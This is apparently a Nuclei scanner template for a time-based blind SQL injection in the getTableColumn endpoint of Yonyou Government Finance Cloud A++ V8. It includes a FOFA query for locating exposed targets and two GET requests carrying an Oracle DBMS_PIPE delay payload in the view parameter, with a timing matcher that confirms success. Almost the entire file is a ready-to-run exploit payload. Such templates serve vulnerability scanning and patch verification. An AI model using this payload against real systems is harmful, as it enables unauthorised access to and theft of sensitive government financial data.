id: yonyouzhengwucaiwuyun-a-v8-gettablecolumn-sql-time

info:
  name: 用友政务财务云A++ V8 lp/gwzjConfig/getTableColumn SQL延时注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: app="用友-政务财务系统"
    用友政务财务云A++ V8 lp/gwzjConfig/getTableColumn 接口存在SQL延时注入漏洞，攻击者可以通过构造恶意的view参数进行时间盲注，可能导致数据库敏感信息泄露，甚至进一步获取服务器系统权限。
  reference:
    - 
  tags: sql-time, yonyouzhengwucaiwuyun, a-v8

http:
  - raw:
      - |-
        GET /lp/gwzjConfig/getTableColumn?view=LP_PAYFILES_INFO%27%20AND%202173%3DDBMS_PIPE.RECEIVE_MESSAGE(CHR(80)%7C%7CCHR(88)%7C%7CCHR(105)%7C%7CCHR(87)%2C4)%20AND%20%27Hsxt%27%3D%27Hsxt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip
        Connection: keep-alive

      - |-
        GET /lp/gwzjConfig/getTableColumn?view=LP_PAYFILES_INFO%27%20AND%202173%3DDBMS_PIPE.RECEIVE_MESSAGE(CHR(80)%7C%7CCHR(88)%7C%7CCHR(105)%7C%7CCHR(87)%2C8)%20AND%20%27Hsxt%27%3D%27Hsxt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip
        Connection: keep-alive

    matchers:
      - type: dsl
        name: SQL延时注入
        dsl:
          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"